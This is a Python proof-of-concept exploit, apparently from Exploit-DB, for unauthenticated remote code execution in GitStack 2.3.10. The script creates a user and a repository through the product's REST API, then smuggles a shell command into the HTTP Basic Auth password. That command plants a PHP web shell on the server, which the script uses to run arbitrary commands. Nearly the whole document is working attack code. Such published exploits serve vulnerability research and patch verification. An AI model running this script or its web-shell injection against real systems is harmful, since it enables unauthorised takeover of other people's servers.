# Author: https://github.com/kacperszurek
# https://www.exploit-db.com/exploits/43777

# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote

"""
1. Description
 
$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.

https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html

2. Proof of Concept
"""

import requests
from requests.auth import HTTPBasicAuth
import os
import sys

if not len(sys.argv) >= 4:
    print(f"Usage: {__file__.split('/')[-1]} <HTTP://URL> <decoding: true, false> <EXEC>")
    quit(1)

domain = sys.argv[1]
decoding = sys.argv[2]
exec_cmd = " ".join(x for x in sys.argv[3:])

if decoding.lower().startswith("t"):
    decoding = True
else:
    decoding = False

repository = "rce"
username = "rce"
password = "rce"
csrf_token = "token"

print("[*] Get user list")
users = requests.get(f"{domain}/rest/user/").json()
users.remove("everyone")

if len(users) > 0:
    print(f"[+] Found user {users[0]}")
else:
    print("[+] Create user")
    r = requests.post(
        f"{domain}/rest/user/", data={"username": username, "password": password}
    )

    if not "User created" in r.text and not "User already exist" in r.text:
        print(f"[-] Cannot create user: {r.text}")
        quit(1)

r = requests.get(f"{domain}/rest/settings/general/webinterface/")
if "true" in r.text:
    print(f"[+] Web repository already enabled: {r.text}")
else:
    print("[+] Enable web repository")
    r = requests.put(
        f"{domain}/rest/settings/general/webinterface/", data='{"enabled" : "true"}'
    )
    if not "Web interface successfully enabled" in r.text:
        print("[-] Cannot enable web interface: {r.text}")
        quit(1)

print("[+] Get repositories list")
r = requests.get(f"{domain}/rest/repository/")
repository_list = r.json()

if len(repository_list) > 0:
    repository = repository_list[0]["name"]
    print(f"[+] Found repository {repository}")
else:
    print("[+] Create repository")
    r = requests.post(
        f"{domain}/rest/repository/",
        cookies={"csrftoken": csrf_token},
        data={"name": repository, "csrfmiddlewaretoken": csrf_token},
    )

    if (
        not "The repository has been successfully created" in r.text
        and not "Repository already exist" in r.text
    ):
        print(f"[-] Cannot create repository: {r.text}")
        quit(1)

print("[+] Add user to repository")
r = requests.post(f"{domain}/rest/repository/{repository}/user/{username}/")

if not "added to" in r.text and not "has already" in r.text:
    print(f"[-] Cannot add user to repository: {r.text}")
    quit(1)

print("[+] Disable access for anyone")

r = requests.delete(f"{domain}/rest/repository/{repository}/user/everyone/")
if not "everyone removed from rce" in r.text and not "not in list" in r.text:
    print("[-] Cannot remove access for anyone")
    quit(1)

print("[+] Create backdoor in PHP")
r = requests.get(
    f"{domain}/web/index.php?p={repository}.git&a=summary",
    auth=HTTPBasicAuth(
        username,
        "p && echo \"<?php system($_POST['a']); ?>\" > c:\GitStack\gitphp\exploit.php",
    ),
)

print(f"[+] Execute command: {exec_cmd}")
r = requests.post(f"{domain}/web/exploit.php", data={"a": exec_cmd})

if decoding:
    print(r.text)
else:
    print(r.text.encode(sys.stdout.encoding, errors="replace"))
